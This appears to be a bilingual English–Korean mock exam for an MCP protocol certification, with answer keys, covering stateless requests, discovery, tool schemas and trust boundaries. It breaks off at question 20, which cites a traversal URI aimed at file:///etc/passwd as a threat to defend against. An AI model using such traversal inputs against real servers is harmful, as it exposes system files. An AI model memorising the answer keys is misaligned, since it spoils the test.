# MCPA 모의고사 01: MCPA Full-Length Mock 1: Operational Scenarios

> 실제 시험 문항이 아니며 출제 내용을 보장하지 않는다. 리눅스 재단(Linux Foundation)과 AAIF의 공식 자료가 아니다.
> 한국어 번역과 덧붙인 메모는 AI로 작성했으므로 틀린 곳이 있을 수 있다. 공식 스펙이 우선이다: https://modelcontextprotocol.io/specification/2026-07-28
> 원문 가운데 시험(exam)을 언급한 문장은 원작자의 설명을 그대로 옮긴 것이며 이 저장소의 의견이 아니다.

원본: rohitg00/ai-engineering-from-scratch `certifications/mcpa/assessments/mcpa-f/mock-01.json` (버전 1). 제한 시간 90분, 60문항.

도메인별 문항 수: mcp-fundamentals 10, architecture-and-components 8, interactions-and-execution 16, security-and-governance 14, use-cases-and-ecosystem 12. 유형: single 50, multiple 10.

영어 원문 아래 한국어 번역을 붙였다. 원문은 `mock-01.en.md`.

## 1. [mcp-fundamentals]

A platform team currently maintains a separate hand-written connector between each of six internal applications and nine external systems, and the number of connectors keeps growing as new applications and systems are added. Leadership asks whether adopting one shared protocol like MCP for context and tool access would help. What is the strongest justification?

A. MCP turns the multiplicative growth of custom connectors into an additive one across compliant applications and systems\
B. MCP replaces the need for any authorization or consent step between an application and the systems it reaches\
C. MCP guarantees every external system will expose identical data regardless of what that system actually stores\
D. MCP removes the need for the team to ever choose which specific large language model an application uses internally today

**한국어**

플랫폼 팀은 지금 사내 애플리케이션 6개와 외부 시스템 9개 사이에 손으로 작성한 커넥터를 하나씩 따로 관리하고 있다. 애플리케이션과 시스템이 추가될 때마다 커넥터 수는 계속 늘어난다. 경영진은 컨텍스트와 tool 접근에 MCP 같은 공용 프로토콜 하나를 도입하면 도움이 되는지 묻는다. 가장 강력한 근거는 무엇인가?

A. MCP는 규격을 따르는 애플리케이션과 시스템 사이에서 맞춤 커넥터의 곱셈적 증가를 덧셈적 증가로 바꾼다\
B. MCP는 애플리케이션과 그것이 접근하는 시스템 사이의 인가나 동의 단계를 아예 필요 없게 만든다\
C. MCP는 외부 시스템이 실제로 무엇을 저장하든 모든 외부 시스템이 동일한 데이터를 노출하도록 보장한다\
D. MCP는 애플리케이션이 지금 내부에서 어떤 대형 언어 모델을 쓸지 팀이 고를 필요를 영영 없앤다

<details><summary>정답</summary>

A. MCP standardizes the integration surface between AI applications and external systems, so growth changes from roughly the count of applications times systems to roughly their sum. It does not choose models, guarantee identical data, or remove authorization requirements.

A. MCP는 AI 애플리케이션과 외부 시스템 사이의 통합 지점을 표준화한다. 그래서 증가 규모가 대략 애플리케이션 수 곱하기 시스템 수에서 대략 둘의 합으로 바뀐다. MCP는 모델을 고르지 않고 동일한 데이터를 보장하지 않으며 인가 요건을 없애지도 않는다.

</details>

## 2. [mcp-fundamentals]

A support engineer who is new to the team tells a colleague that every MCP exchange must open with an initialize request before the server will accept any other call. The colleague is reviewing the 2026-07-28 specification. How should the colleague respond?

A. Agree, because initialize still creates the shared session that every later request in the exchange truly depends on\
B. Explain that initialize and sessions were removed, since every request now carries its own version and capabilities\
C. Agree, but note that only remote HTTP servers still require the complete initialize handshake today\
D. Explain that initialize is now considered fully optional but still returns a session id for later calls

**한국어**

팀에 새로 온 지원 엔지니어가 동료에게 모든 MCP 교환은 initialize 요청으로 시작해야 server가 다른 호출을 받아 준다고 말한다. 동료는 2026-07-28 명세를 검토하는 중이다. 동료는 어떻게 답해야 하는가?

A. 동의한다. initialize는 여전히 공유 세션을 만들고 그 교환의 이후 모든 요청이 실제로 그 세션에 의존하기 때문이다\
B. initialize와 세션은 제거됐다고 설명한다. 이제 모든 요청이 자체 버전과 capability를 담아 보내기 때문이다\
C. 동의하되, 오늘날에는 원격 HTTP server만 여전히 initialize 핸드셰이크 전체를 요구한다고 덧붙인다\
D. initialize는 이제 완전히 선택 사항으로 간주되지만 이후 호출용 세션 id는 여전히 반환한다고 설명한다

<details><summary>정답</summary>

B. The 2026-07-28 revision removed the initialize request and notifications/initialized along with protocol sessions. Every request instead carries protocolVersion, clientCapabilities, and related fields in its own per-request metadata, so no handshake or session is required.

B. 2026-07-28 개정판은 initialize 요청과 notifications/initialized를 프로토콜 세션과 함께 제거했다. 대신 모든 요청이 protocolVersion, clientCapabilities와 관련 필드를 요청별 메타데이터에 직접 담는다. 그래서 핸드셰이크나 세션이 필요 없다.

</details>

## 3. [mcp-fundamentals]

A team is deciding whether it is still safe to rely on the roots feature in a client they are building. One engineer says the feature was removed in 2026-07-28 and must be deleted immediately. Another checks the deprecated features registry. What does the registry actually show for a deprecated feature like roots?

A. It is undocumented, so the team must simply guess its status from forum posts\
B. It is Active and considered fully current, so no change is required for years right now\
C. It is Deprecated, still functional, with a migration path and an earliest removal date\
D. It is Removed already, so any client code that calls it will fail immediately

**한국어**

한 팀이 만들고 있는 client에서 roots 기능에 계속 의존해도 안전한지 판단하려 한다. 한 엔지니어는 그 기능이 2026-07-28에서 제거됐으니 당장 삭제해야 한다고 말한다. 다른 엔지니어는 deprecated 기능 레지스트리를 확인한다. roots처럼 deprecated된 기능에 대해 레지스트리는 실제로 무엇을 보여 주는가?

A. 문서화되어 있지 않으므로 팀은 포럼 글을 보고 상태를 짐작할 수밖에 없다\
B. Active 상태이며 완전히 현행으로 간주되므로 지금으로서는 몇 년간 바꿀 필요가 없다\
C. Deprecated 상태이며 여전히 동작하고 마이그레이션 경로와 가장 이른 제거 날짜가 함께 있다\
D. 이미 Removed 상태이므로 그 기능을 호출하는 client 코드는 즉시 실패한다

<details><summary>정답</summary>

C. The feature lifecycle keeps a deprecated feature specified and working, with a required migration path and a minimum window before removal is even possible. Confusing deprecated with removed causes teams to delete working integrations too early.

C. 기능 생명주기 규칙에서 deprecated 기능은 명세에 남아 계속 동작한다. 필수 마이그레이션 경로가 있고 제거가 가능해지기까지 최소 유예 기간도 있다. deprecated와 removed를 혼동하면 팀이 동작하는 통합을 너무 일찍 지우게 된다.

</details>

## 4. [mcp-fundamentals]

An operator scales a remote MCP server from one replica to three behind a load balancer with no sticky routing. A tool that kept a per-client running total in process memory starts returning totals that jump around between calls. What is the root cause?

A. The load balancer is rewriting JSON-RPC ids, so results get matched to the wrong calls\
B. The client stopped declaring capabilities after its first call, so later replicas ignore it\
C. Each replica negotiates its own protocol version, so replicas disagree on the result format\
D. The total lived in one replica's memory, so replicas that never saw it cannot continue it

**한국어**

운영자가 원격 MCP server를 replica 1개에서 3개로 늘리고 sticky 라우팅 없이 로드 밸런서 뒤에 두었다. 프로세스 메모리에 client별 누적 합계를 보관하던 tool이 호출할 때마다 들쭉날쭉한 합계를 반환하기 시작한다. 근본 원인은 무엇인가?

A. 로드 밸런서가 JSON-RPC id를 다시 쓰고 있어서 결과가 엉뚱한 호출에 짝지어진다\
B. client가 첫 호출 이후 capability 선언을 멈춰서 이후 replica가 그 client를 무시한다\
C. replica마다 자체 프로토콜 버전을 협상해서 replica 사이에 결과 형식이 어긋난다\
D. 합계가 replica 하나의 메모리에만 있었으므로 그 값을 본 적 없는 replica는 이어서 계산할 수 없다

<details><summary>정답</summary>

D. Under the stateless core every request must be answerable from its own contents plus any explicit handle it names, so state that spans calls belongs behind a server-minted handle backed by shared storage, not in one replica's memory. Once requests spread across replicas, implicit per-client memory is invisible to the replicas that did not create it, which is exactly the drift the operator sees.

D. stateless core에서는 모든 요청이 자기 내용과 그 요청이 명시한 handle만으로 응답 가능해야 한다. 그래서 여러 호출에 걸친 상태는 replica 하나의 메모리가 아니라 server가 발급한 handle 뒤의 공유 저장소에 두어야 한다. 요청이 여러 replica로 퍼지면 암묵적인 client별 메모리는 그것을 만들지 않은 replica에서 보이지 않는다. 운영자가 보는 값 흔들림이 바로 이것이다.

</details>

## 5. [mcp-fundamentals]

A developer who previously built JSON-RPC batch clients wants to send several tool calls in one HTTP POST body to a 2026-07-28 server to save round trips. What should the developer expect?

A. The request is rejected, since batching was removed and each POST body now carries exactly one request\
B. The server processes only the first call in the array and silently drops the rest\
C. The server happily accepts the whole batch and answers each call inside one large combined result array\
D. The server queues the extra calls and answers them one at a time over minutes

**한국어**

예전에 JSON-RPC 배치 client를 만들어 본 개발자가 왕복 횟수를 줄이려고 2026-07-28 server에 HTTP POST 본문 하나로 tool 호출 여러 개를 보내려 한다. 개발자는 어떤 결과를 예상해야 하는가?

A. 요청이 거부된다. 배치는 제거됐고 이제 POST 본문 하나에는 정확히 요청 하나만 담기기 때문이다\
B. server가 배열의 첫 호출만 처리하고 나머지는 조용히 버린다\
C. server가 배치 전체를 문제없이 받아들이고 각 호출에 대한 답을 하나의 큰 결합 결과 배열에 담아 돌려준다\
D. server가 나머지 호출을 큐에 넣고 몇 분에 걸쳐 하나씩 답한다

<details><summary>정답</summary>

A. JSON-RPC batching was removed from MCP in the 2025-06-18 revision and remains absent in 2026-07-28, so a Streamable HTTP POST body must contain exactly one JSON-RPC request or notification rather than an array of several.

A. JSON-RPC 배치는 2025-06-18 개정판에서 MCP에서 제거됐고 2026-07-28에도 여전히 없다. 그래서 Streamable HTTP POST 본문에는 여러 개를 담은 배열이 아니라 정확히 하나의 JSON-RPC 요청이나 notification이 들어가야 한다.

</details>

## 6. [mcp-fundamentals]

A new teammate asks how a host relates to the clients and servers it works with. Which description matches the 2026-07-28 architecture?

A. The host is a single client that multiplexes every server connection over one shared common channel\
B. The host embeds one client per server connection, and each client talks to exactly one server\
C. Each server embeds its own client to reach the host directly\
D. Clients and servers connect to each other directly, with the host present only for billing

**한국어**

새 팀원이 host가 함께 일하는 client와 server와 어떤 관계인지 묻는다. 2026-07-28 아키텍처에 맞는 설명은 무엇인가?

A. host는 단일 client이며 모든 server 연결을 하나의 공유 공통 채널 위에서 다중화한다\
B. host는 server 연결마다 client를 하나씩 내장하고 각 client는 정확히 하나의 server와 통신한다\
C. 각 server가 host에 직접 닿기 위해 자체 client를 내장한다\
D. client와 server는 서로 직접 연결되고 host는 과금 용도로만 존재한다

<details><summary>정답</summary>

B. A host application embeds one client instance per server connection, so each client maintains a one to one relationship with a single server while the host coordinates the overall set of connections and aggregates their results for the model.

B. host 애플리케이션은 server 연결마다 client 인스턴스를 하나씩 내장한다. 그래서 각 client는 server 하나와 일대일 관계를 유지한다. host는 전체 연결 집합을 조율하고 그 결과를 모아 모델에 넘긴다.

</details>

## 7. [mcp-fundamentals]

A vendor proposes that the company build one bespoke SDK per partner system instead of adopting MCP, arguing that a shared protocol adds unnecessary abstraction. What is the strongest counterpoint grounded in interoperability?

A. A shared protocol means partner systems no longer need to publish any documentation at all\
B. A shared protocol removes the need to ever negotiate a protocol version again\
C. A shared protocol lets any compliant client use any compliant server without system-specific glue code\
D. A shared protocol supposedly guarantees every single partner system will have identical performance results

**한국어**

한 벤더가 공용 프로토콜은 불필요한 추상화를 더한다며 MCP를 도입하는 대신 파트너 시스템마다 맞춤 SDK를 하나씩 만들자고 제안한다. 상호운용성에 근거한 가장 강력한 반론은 무엇인가?

A. 공용 프로토콜을 쓰면 파트너 시스템이 더 이상 어떤 문서도 공개할 필요가 없다\
B. 공용 프로토콜을 쓰면 다시는 프로토콜 버전을 협상할 필요가 없다\
C. 공용 프로토콜을 쓰면 규격을 따르는 어떤 client든 시스템별 접착 코드 없이 규격을 따르는 어떤 server든 쓸 수 있다\
D. 공용 프로토콜은 모든 파트너 시스템이 동일한 성능 결과를 내도록 보장한다고 여겨진다

<details><summary>정답</summary>

C. The value of one open protocol is that discovery and capability negotiation are data rather than code, so a client built once can work with any conforming server. It does not equalize performance, remove version negotiation, or replace documentation.

C. 하나의 개방형 프로토콜이 주는 가치는 탐색과 capability 협상이 코드가 아니라 데이터라는 점이다. 그래서 한 번 만든 client가 규격을 따르는 어떤 server와도 동작한다. 성능을 똑같이 맞추거나, 버전 협상을 없애거나, 문서를 대체하지는 않는다.

</details>

## 8. [mcp-fundamentals] (복수 정답)

An architecture review is listing the real benefits of adopting one open protocol like MCP instead of custom point-to-point integrations. Which two statements are accurate? Select two.

A. The specific model that the host application uses internally no longer needs to be chosen or configured at all\
B. Every server automatically inherits the exact same user interface as every other connected server today\
C. Any modern client can use any modern server without integration-specific code, because discovery is expressed as data\
D. Growth in the number of connectors becomes additive across applications and systems instead of multiplicative

**한국어**

아키텍처 리뷰에서 맞춤형 점대점 통합 대신 MCP 같은 개방형 프로토콜 하나를 도입할 때의 실제 이점을 정리하고 있다. 맞는 설명 두 개는 무엇인가? 두 개 고르시오.

A. host 애플리케이션이 내부에서 쓰는 특정 모델을 더 이상 고르거나 설정할 필요가 전혀 없다\
B. 오늘날 모든 server가 연결된 다른 모든 server와 정확히 같은 사용자 인터페이스를 자동으로 물려받는다\
C. 탐색이 데이터로 표현되므로 최신 client라면 통합별 코드 없이 최신 server 어느 것이든 쓸 수 있다\
D. 커넥터 수의 증가가 애플리케이션과 시스템 사이에서 곱셈적이 아니라 덧셈적이 된다

<details><summary>정답</summary>

C, D. Standardizing the wire between applications and systems lets a client discover and use any compliant server without bespoke glue code, turning multiplicative integration growth into additive growth. MCP does not standardize user interfaces or choose which model a host runs.

C, D. 애플리케이션과 시스템 사이의 통신 규격을 표준화하면 client가 맞춤 접착 코드 없이 규격을 따르는 어떤 server든 찾아서 쓸 수 있다. 그 결과 통합 수의 곱셈적 증가가 덧셈적 증가로 바뀐다. MCP는 사용자 인터페이스를 표준화하지 않고 host가 어떤 모델을 돌릴지도 고르지 않는다.

</details>

## 9. [mcp-fundamentals]

While reading a changelog entry for the 2026-07-28 revision, an engineer sees a line that references a specific SEP number and a short headline. What is the correct way to use that entry to judge whether a feature is safe to build against today?

A. Ignore the changelog entirely and rely only on the previous revision's own documentation\
B. Treat the changelog headline alone as fully sufficient, since SEP numbers are only historical trivia anyway\
C. Assume every single changelog entry describes a feature that is now already removed\
D. Look up the referenced SEP and the current specification page to confirm the feature's lifecycle stage

**한국어**

2026-07-28 개정판의 changelog 항목을 읽던 엔지니어가 특정 SEP 번호와 짧은 제목이 적힌 줄을 본다. 지금 어떤 기능을 믿고 개발해도 안전한지 판단할 때 그 항목을 쓰는 올바른 방법은 무엇인가?

A. changelog는 완전히 무시하고 이전 개정판 자체의 문서에만 의존한다\
B. SEP 번호는 어차피 역사적 잡지식일 뿐이므로 changelog 제목만으로 충분하다고 본다\
C. changelog 항목은 하나같이 이미 제거된 기능을 설명한다고 가정한다\
D. 언급된 SEP와 현재 명세 페이지를 찾아 그 기능의 생명주기 단계를 확인한다

<details><summary>정답</summary>

D. A changelog entry names what changed and links to the proposal that drove it, but the authoritative status of a feature is its current lifecycle stage on the specification and deprecated-features pages, which the reader should confirm directly rather than guessing from the headline.

D. changelog 항목은 무엇이 바뀌었는지 밝히고 그 변경을 이끈 제안으로 연결해 준다. 하지만 기능의 공식 상태는 명세 페이지와 deprecated 기능 페이지에 있는 현재 생명주기 단계다. 읽는 사람은 제목으로 짐작하지 말고 그것을 직접 확인해야 한다.

</details>

## 10. [mcp-fundamentals] (복수 정답)

A team is documenting why their MCP server design keeps every request self-contained instead of relying on connection state. Which two consequences follow from that stateless design? Select two.

A. Any replica behind a load balancer can correctly answer any incoming request\
B. The server can skip declaring resultType because the connection already establishes what kind of answer to expect\
C. A dropped and retried request can be routed to a different server instance without breaking correctness\
D. The server may safely infer a client's identity from an earlier request on the same connection

**한국어**

한 팀이 자기 MCP server 설계가 연결 상태에 의존하지 않고 모든 요청을 자기 완결적으로 유지하는 이유를 문서로 정리하고 있다. 그 stateless 설계에서 따라 나오는 결과 두 개는 무엇인가? 두 개 고르시오.

A. 로드 밸런서 뒤의 어떤 replica든 들어오는 어떤 요청에든 올바르게 답할 수 있다\
B. 연결이 어떤 종류의 답을 기대할지 이미 정해 두므로 server는 resultType 선언을 생략할 수 있다\
C. 끊겼다가 재시도된 요청을 다른 server 인스턴스로 보내도 정확성에 문제가 생기지 않는다\
D. server는 같은 연결의 이전 요청을 보고 client의 신원을 안전하게 추론해도 된다

<details><summary>정답</summary>

A, C. Because no information may carry over from a prior request on the same connection, any replica can serve any request and a retry is safe to route anywhere, which is exactly why load balancers need no stickiness under the stateless core.

A, C. 같은 연결의 이전 요청에서 어떤 정보도 넘어와서는 안 되므로, 어떤 replica든 어떤 요청이든 처리할 수 있고 재시도를 어디로 보내도 안전하다. stateless core에서 로드 밸런서에 sticky 설정이 필요 없는 이유가 바로 이것이다.

</details>

## 11. [architecture-and-components]

A client sends a tools/call request for a tool whose description says it may ask the user follow-up questions, but the client's request never declared the elicitation capability. What should the server do?

A. Answer with a MissingRequiredClientCapability error naming the capability the client must declare\
B. Silently downgrade the entire tool call to a safer read-only variant instead\
C. Cache the request indefinitely until the client eventually declares the missing capability itself\
D. Proceed anyway regardless, since capability declarations are only a minor formality

**한국어**

client가 설명에 사용자에게 후속 질문을 할 수 있다고 적힌 tool에 tools/call 요청을 보낸다. 그런데 client의 요청은 elicitation capability를 선언하지 않았다. server는 어떻게 해야 하는가?

A. client가 선언해야 하는 capability를 밝힌 MissingRequiredClientCapability 오류로 답한다\
B. tool 호출 전체를 조용히 더 안전한 읽기 전용 변형으로 낮춰 처리한다\
C. client가 언젠가 빠진 capability를 스스로 선언할 때까지 요청을 무기한 캐시해 둔다\
D. capability 선언은 사소한 형식일 뿐이므로 상관없이 그냥 진행한다

<details><summary>정답</summary>

A. A server must not rely on a capability the client did not declare on that specific request, so when it needs elicitation and the request lacks that capability, it returns the MissingRequiredClientCapability error with the required capabilities listed in the error data.

A. server는 client가 그 요청에서 선언하지 않은 capability에 의존해서는 안 된다. 그래서 elicitation이 필요한데 요청에 그 capability가 없으면, 필요한 capability를 오류 data에 나열한 MissingRequiredClientCapability 오류를 반환한다.

</details>

## 12. [architecture-and-components]

A tool defines an outputSchema describing a structured invoice object. A client calls the tool and receives a result with structuredContent that does not match that schema. What does this indicate about the server's implementation?

A. The client must have sent an incorrectly formed inputSchema along with the original call\
B. The server violated its own contract, since structuredContent must conform to a declared outputSchema\
C. Nothing at all, because outputSchema is only decorative and is never checked against the actual result\
D. The mismatch is expected whenever a tool also happens to return a text content block

**한국어**

어떤 tool이 구조화된 송장 객체를 설명하는 outputSchema를 정의한다. client가 그 tool을 호출해 받은 결과의 structuredContent가 그 스키마와 맞지 않는다. 이것은 server 구현에 대해 무엇을 뜻하는가?

A. client가 원래 호출과 함께 잘못된 형태의 inputSchema를 보냈음이 틀림없다\
B. server가 자기 계약을 어겼다. structuredContent는 선언된 outputSchema를 따라야 하기 때문이다\
C. 아무 의미도 없다. outputSchema는 장식일 뿐이고 실제 결과와 대조되는 일이 없기 때문이다\
D. tool이 text content 블록도 함께 반환하는 경우에는 불일치가 예상되는 일이다

<details><summary>정답</summary>

B. When a tool declares an outputSchema, any structuredContent the server returns must conform to it, and the server should also serialize the same data into a text block for compatibility. A mismatch is a defect in the server's tool implementation, not a client error.

B. tool이 outputSchema를 선언하면 server가 반환하는 structuredContent는 반드시 그것을 따라야 한다. server는 호환성을 위해 같은 데이터를 text 블록으로도 직렬화해야 한다. 불일치는 client 오류가 아니라 server의 tool 구현 결함이다.

</details>

## 13. [architecture-and-components]

A manifest reviewer sees a tool definition whose name is get_forecast and whose title is Get 7-Day Forecast. Which field must a client send as params.name when it calls this tool, and what is the other field for?

A. Neither one, since tools/call identifies a tool by its position in the tools/list array\
B. title in params.name, since title is the canonical identifier and name is a display hint\
C. name in params.name, since name is the programmatic identifier and title is for display\
D. Either one, since servers resolve a call by matching name and title interchangeably

**한국어**

매니페스트 검토자가 name이 get_forecast이고 title이 Get 7-Day Forecast인 tool 정의를 본다. client가 이 tool을 호출할 때 params.name으로 보내야 하는 필드는 무엇이고 다른 필드는 무엇을 위한 것인가?

A. 둘 다 아니다. tools/call은 tools/list 배열 안의 위치로 tool을 식별하기 때문이다\
B. params.name에 title을 보낸다. title이 정식 식별자이고 name은 표시용 힌트이기 때문이다\
C. params.name에 name을 보낸다. name이 프로그램용 식별자이고 title은 표시용이기 때문이다\
D. 아무거나 보낸다. server는 name과 title을 서로 바꿔 가며 맞춰 호출을 찾기 때문이다

<details><summary>정답</summary>

C. Tool metadata separates a programmatic name, which clients send in params.name on tools/call, from an optional human-readable title that hosts show in their user interfaces. Calling by title, or by position in the list, breaks as soon as the display text or the ordering changes.

C. tool 메타데이터는 프로그램용 name과 사람이 읽는 선택적 title을 구분한다. client는 tools/call에서 name을 params.name으로 보내고 host는 title을 사용자 인터페이스에 보여 준다. title이나 목록 내 위치로 호출하면 표시 문구나 순서가 바뀌는 순간 호출이 실패한다.

</details>

## 14. [architecture-and-components]

In the model interaction flow, a host is about to let the model call a tool annotated as destructive. Where does the host's confirmation step belong in that flow?

A. Only inside the server, since the host has no visibility into tool annotations\
B. Inside the model's own hidden reasoning, invisible to the host\
C. After the server has already executed the tool, as a post-hoc notice\
D. Before the client sends tools/call, so a human can approve or deny the action

**한국어**

모델 상호작용 흐름에서 host가 destructive로 표시된 tool을 모델이 호출하도록 허용하려 한다. host의 확인 단계는 그 흐름의 어디에 있어야 하는가?

A. server 안에만 둔다. host는 tool annotation을 볼 수 없기 때문이다\
B. 모델 자체의 숨겨진 추론 안에 두며 host에게는 보이지 않는다\
C. server가 이미 tool을 실행한 뒤에 사후 알림으로 둔다\
D. client가 tools/call을 보내기 전에 두어 사람이 그 동작을 승인하거나 거부할 수 있게 한다

<details><summary>정답</summary>

D. The interaction flow places human confirmation of sensitive calls before the client actually sends the request, so a destructive action can be denied rather than merely logged afterward. The host reads the tool's annotations and inputs to decide whether to prompt.

D. 상호작용 흐름은 민감한 호출에 대한 사람의 확인을 client가 실제로 요청을 보내기 전에 둔다. 그래야 destructive 동작을 나중에 기록만 하는 것이 아니라 거부할 수 있다. host는 tool의 annotation과 입력을 읽고 확인을 띄울지 결정한다.

</details>

## 15. [architecture-and-components]

A platform team runs one MCP server locally over stdio for filesystem access and a second MCP server remotely over Streamable HTTP for a SaaS integration. A reviewer claims both servers share one trust boundary because the host treats them the same way in its tool registry. What is the correct correction?

A. The trust boundary follows the process and network boundary, so the two servers sit in different trust domains\
B. Trust boundaries are set entirely by which capabilities a server declares in its discover result\
C. Both servers share one trust boundary as long as they expose tools with different names\
D. Only the remote HTTP server has a real trust boundary, since a local subprocess is inherently trusted

**한국어**

플랫폼 팀이 파일 시스템 접근용 MCP server 하나는 로컬에서 stdio로, SaaS 통합용 MCP server 하나는 원격에서 Streamable HTTP로 돌린다. 한 검토자는 host가 tool 레지스트리에서 두 server를 똑같이 다루므로 두 server가 하나의 신뢰 경계를 공유한다고 주장한다. 올바른 정정은 무엇인가?

A. 신뢰 경계는 프로세스 경계와 네트워크 경계를 따르므로 두 server는 서로 다른 신뢰 도메인에 있다\
B. 신뢰 경계는 전적으로 server가 discover 결과에서 어떤 capability를 선언하는지로 정해진다\
C. 이름이 서로 다른 tool을 노출하는 한 두 server는 하나의 신뢰 경계를 공유한다\
D. 로컬 하위 프로세스는 본질적으로 신뢰되므로 원격 HTTP server에만 실제 신뢰 경계가 있다

<details><summary>정답</summary>

A. Trust domains follow process and network boundaries rather than how a host happens to list tools, so a local stdio subprocess and a remote HTTP service are separate trust domains even when the host aggregates both into one registry. Naming and declared capabilities do not redraw that boundary.

A. 신뢰 도메인은 host가 tool을 어떻게 나열하느냐가 아니라 프로세스 경계와 네트워크 경계를 따른다. 그래서 host가 둘을 하나의 레지스트리로 모아도 로컬 stdio 하위 프로세스와 원격 HTTP 서비스는 별개의 신뢰 도메인이다. 이름 짓기나 선언된 capability로 그 경계가 다시 그어지지 않는다.

</details>

## 16. [architecture-and-components] (복수 정답)

A client is deciding when it must call server/discover before using a server. Which two statements about discovery are correct? Select two.

A. Servers may entirely skip implementing server/discover whenever they only expose a single simple tool overall\
B. Calling server/discover is optional for a client, since it may send a request directly and handle a version error\
C. A DiscoverResult must always be answered before any other kind of request is allowed to be sent at all\
D. The instructions field returned by discover is natural-language guidance for the model, not a machine-checked contract

**한국어**

client가 server를 쓰기 전에 언제 server/discover를 호출해야 하는지 정하려 한다. discovery에 관해 맞는 설명 두 개는 무엇인가? 두 개 고르시오.

A. server는 전체적으로 단순한 tool 하나만 노출할 때는 server/discover 구현을 완전히 건너뛰어도 된다\
B. client에게 server/discover 호출은 선택 사항이다. 요청을 바로 보내고 버전 오류를 처리해도 되기 때문이다\
C. 다른 어떤 종류의 요청이든 보내기 전에 반드시 항상 DiscoverResult를 먼저 받아야 한다\
D. discover가 반환하는 instructions 필드는 모델을 위한 자연어 안내이지, 기계가 검사하는 계약이 아니다

<details><summary>정답</summary>

B, D. Discovery is optional for clients but mandatory for servers to implement, and a DiscoverResult's instructions field is descriptive guidance for the model rather than an enforced contract. No request ordering requires discover to run first, and skipping it is never conditioned on a server's tool count.

B, D. discovery는 client에게는 선택 사항이지만 server에게는 구현이 필수다. DiscoverResult의 instructions 필드는 강제되는 계약이 아니라 모델을 위한 설명형 안내다. discover를 먼저 실행해야 한다는 요청 순서 규칙은 없고 discover 생략 여부가 server의 tool 개수에 따라 달라지지도 않는다.

</details>

## 17. [architecture-and-components]

A tool's inputSchema has no $schema keyword at all, and the client team's validator library defaults to an older JSON Schema draft. Which dialect should the client apply when validating arguments against this schema?

A. Whatever dialect the validator library defaults to, since MCP leaves the choice open\
B. JSON Schema 2020-12, since MCP makes it the default dialect when $schema is absent\
C. Draft-04, since it remains the most widely deployed JSON Schema dialect in libraries\
D. Draft-07, since most early MCP servers were written against that particular draft

**한국어**

어떤 tool의 inputSchema에 $schema 키워드가 아예 없고 client 팀의 검증 라이브러리는 기본값으로 더 오래된 JSON Schema draft를 쓴다. client가 이 스키마로 인자를 검증할 때 어떤 dialect를 적용해야 하는가?

A. 검증 라이브러리의 기본 dialect를 쓴다. MCP는 그 선택을 열어 두기 때문이다\
B. JSON Schema 2020-12를 쓴다. $schema가 없을 때 MCP는 이것을 기본 dialect로 삼기 때문이다\
C. Draft-04를 쓴다. 라이브러리에서 여전히 가장 널리 배포된 JSON Schema dialect이기 때문이다\
D. Draft-07을 쓴다. 초기 MCP server 대부분이 그 draft를 기준으로 작성됐기 때문이다

<details><summary>정답</summary>

B. MCP schemas default to the JSON Schema 2020-12 dialect when they carry no $schema keyword, so a validator must apply 2020-12 semantics instead of its own library default or an older draft. A schema that needs another dialect has to declare it explicitly with $schema.

B. MCP 스키마는 $schema 키워드가 없으면 JSON Schema 2020-12 dialect를 기본으로 한다. 그래서 검증기는 라이브러리 기본값이나 오래된 draft가 아니라 2020-12 의미를 적용해야 한다. 다른 dialect가 필요한 스키마는 $schema로 명시적으로 선언해야 한다.

</details>

## 18. [architecture-and-components]

A host rebuilds its tool list for the model on every turn, but the order of tools within that list changes randomly each time based on dictionary iteration order in the host's own code. A teammate says this is harmless. Why is it actually a problem?

A. It is a problem only because JSON object keys are technically unordered in the specification\
B. It is a problem only because the model refuses to call any tool that is not listed first\
C. tools/list results should be deterministically ordered, and random ordering defeats client and LLM prompt-cache hits\
D. It is not a problem, since tool order has no effect on caching or on anything the model does

**한국어**

host가 매 턴마다 모델에 줄 tool 목록을 다시 만드는데, 목록 안 tool 순서가 host 코드의 딕셔너리 순회 순서에 따라 매번 무작위로 바뀐다. 한 팀원은 이것이 무해하다고 말한다. 실제로는 왜 문제인가?

A. 명세상 JSON 객체 키에는 엄밀히 순서가 없다는 점 때문에만 문제다\
B. 모델이 첫 번째로 나열되지 않은 tool은 호출을 거부한다는 점 때문에만 문제다\
C. tools/list 결과는 결정적인 순서여야 하며 무작위 순서는 client와 LLM 프롬프트 캐시 적중을 무너뜨린다\
D. 문제가 아니다. tool 순서는 캐싱에도, 모델이 하는 어떤 일에도 영향을 주지 않는다

<details><summary>정답</summary>

C. Tool listings should be deterministically ordered so that client-side caching and the model provider's own prompt caching can recognize a stable, repeated prefix. Randomizing the order breaks that stability even though the set of tools and their definitions have not actually changed.

C. tool 목록은 결정적인 순서여야 한다. 그래야 client 쪽 캐시와 모델 제공자의 프롬프트 캐시가 안정적으로 반복되는 접두부를 알아볼 수 있다. 순서를 무작위로 바꾸면 tool 집합과 정의가 실제로 바뀌지 않았어도 그 안정성이 사라진다.

</details>

## 19. [interactions-and-execution]

A tool's result needs to hand back an image the model should reason about plus a pointer to a large log file the model should not have to read in full. Which combination of content blocks fits both needs?

A. Two text blocks, one describing the image and one describing the log file\
B. An audio content block for the image and a text block for the log file\
C. A single embedded resource block containing both the image bytes and the entire log file text\
D. An image content block for the picture, plus a resource_link pointing at the log file

**한국어**

어떤 tool의 결과가 모델이 추론해야 할 이미지와, 모델이 전부 읽을 필요는 없는 큰 로그 파일을 가리키는 포인터를 함께 돌려줘야 한다. 두 요구에 맞는 content 블록 조합은 무엇인가?

A. text 블록 두 개. 하나는 이미지를 설명하고 하나는 로그 파일을 설명한다\
B. 이미지에는 audio content 블록, 로그 파일에는 text 블록\
C. 이미지 바이트와 로그 파일 텍스트 전체를 함께 담은 embedded resource 블록 하나\
D. 그림에는 image content 블록, 그리고 로그 파일을 가리키는 resource_link

<details><summary>정답</summary>

D. An image content block carries visual data the model can reason about directly, while a resource_link gives the model a reference to a resource, such as a large file, without forcing its full content into context. Using audio for an image would misrepresent the content type.

D. image content 블록은 모델이 바로 추론할 수 있는 시각 데이터를 담는다. resource_link는 큰 파일 같은 resource의 참조를 모델에 주되, 전체 내용을 컨텍스트에 강제로 넣지 않는다. 이미지에 audio를 쓰면 content 유형을 잘못 나타내게 된다.

</details>

## 20. [interactions-and-execution]

An MCP server exposes internal documents through file:// resource URIs. A security reviewer worries this lets a crafted URI like file:///etc/passwd walk outside the intended document tree. What must a compliant server do about this?

A. Sanitize file paths to prevent directory traversal, a check the specification requires of servers\
B. Nothing, since the file:// scheme is only ever reachable by already-trusted local clients\
C. Reject file:// entirely, since 2026-07-28 only permits https:// and git:// resource URIs\
D. Allow it, since resources/read already restricts every caller to their own home directory

**한국어**

